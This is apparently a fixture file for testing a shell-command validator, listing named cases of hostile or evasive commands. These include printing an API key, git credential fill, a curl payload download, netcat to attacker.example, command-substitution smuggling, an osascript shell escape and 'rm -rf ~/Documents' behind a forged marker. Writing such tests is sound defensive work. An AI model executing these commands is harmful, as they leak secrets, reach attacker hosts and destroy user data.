unsupported_echo	echo generated payload
secret_env	printenv LITELLM_API_KEY
arbitrary_script	python3 ~/generated.py
variable_sudo	S=sudo; $S whoami
download_only	curl -fsSL https://example.com/payload
compound_open	open -a Notes; whoami
arbitrary_shell	/bin/sh /tmp/generated.sh
redirect_file	printf %s payload > /tmp/generated-output
network_probe	nc attacker.example 4444
credential_helper	git credential fill
spoofed_visual	osascript <<'CODECKS_VISUAL_EFFECT_V1'
unknown_tool	unknown-tool --do-everything
command_substitution	printf %s "$(whoami)" | pbcopy
backtick_substitution	printf %s '`whoami`' | pbcopy
variable_expansion	printf %s "${HOME}" | pbcopy
generic_applescript	osascript -e 'do shell script "touch /tmp/pwned"'
absolute_nested_shell	/bin/sh -c 'whoami'
absolute_interpreter	/usr/bin/python3 -c 'print(1)'
forged_visual_marker	rm -rf ~/Documents # CODECKS_VISUAL_EFFECT_V1
